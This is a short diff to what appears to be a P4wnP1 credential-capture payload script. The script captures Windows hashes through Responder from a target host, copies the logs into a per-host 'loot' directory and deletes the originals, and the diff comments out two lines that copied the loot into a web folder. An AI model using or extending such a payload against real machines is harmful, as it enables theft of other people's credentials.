@@ -49,7 +49,7 @@ HOST=$TARGET_HOSTNAME
 COUNT=$(ls -lad $LOOTDIR/$HOST* | wc -l)
 COUNT=$((COUNT+1))
 mkdir -p $LOOTDIR/$HOST-$COUNT
-mkdir -p /usr/local/P4wnP1/www/loot/quickcreds/$HOST-$COUNT
+#mkdir -p /usr/local/P4wnP1/www/loot/quickcreds/$HOST-$COUNT
 
 if [ -z "$TARGET_IP" ]; then
 	exit 1
@@ -66,7 +66,7 @@ done
 
 echo "[+] Hashes captured!"
 echo "[*] Copying responder data to loot directory..."
-cp /root/Responder/logs/* /usr/local/P4wnP1/www/loot/quickcreds/$HOST-$COUNT
+#cp /root/Responder/logs/* /usr/local/P4wnP1/www/loot/quickcreds/$HOST-$COUNT
 cp /root/Responder/logs/* $LOOTDIR/$HOST-$COUNT
 echo "[*] Clearing responder logs directory..."
 rm -f /root/Responder/logs/* 2>/dev/null
